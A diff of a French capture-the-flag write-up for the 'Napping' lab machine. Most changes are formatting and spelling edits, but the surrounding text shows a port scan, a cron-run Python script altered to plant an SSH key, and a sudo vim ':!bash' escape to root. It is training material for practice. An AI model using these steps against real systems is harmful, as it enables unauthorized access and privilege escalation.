@@ -39,7 +39,7 @@ MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
 
 On lance un scan exhaustif des ports:  
 
-```bash
+```console
 $ sudo nmap -T5 -sC -Pn -p- napping
 
 Nmap scan report for napping
@@ -210,9 +210,9 @@ else:
     f.close()
 ```
 
-De toute évidence le script est lancé régulièrement :  
+De toute évidence, le script est lancé régulièrement :  
 
-```bash
+```console
 daniel@napping:~$ tail -1 /home/adrian/site_status.txt
 Site is Up: 16/11/2021 22:36:01
 daniel@napping:~$ date
@@ -248,18 +248,16 @@ os.chmod("/home/adrian/.ssh/authorized_keys", stat.S_IREAD|stat.S_IWRITE)
 
 On édite *query.py* avec Vim et on rajoute notre code au début.  
 
-Quelques temps après notre clé est acceptée pour la connexion au compte adrian :  
+Quelque temps après notre clé est acceptée pour la connexion au compte adrian :  
 
-```
-
+```console
 adrian@napping:~$ cat user.txt
 You are nearly there!
-
 ```
 
 Premier réflexe, voir ce qu'il est possible de faire avec ce compte membre du groupe *administrators* :  
 
-```
+```console
 adrian@napping:~$ sudo -l
 Matching Defaults entries for adrian on napping:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -270,9 +268,8 @@ User adrian may run the following commands on napping:
 
 On a un classique cas de lolbin. Sudo autorise l'exécution de */usr/bin/vim* (il faut donner le path en entier) en tant que root sans mot de passe. De là on utilisera la commande *:!bash* pour nous échapper de Vim et accéder à un shell.  
 
-```
-
-sudo /usr/bin/vim
+```console
+$ sudo /usr/bin/vim
 (--snip exécution de bash via :!bash snip--)
 root@napping:/home/adrian# id
 uid=0(root) gid=0(root) groups=0(root)
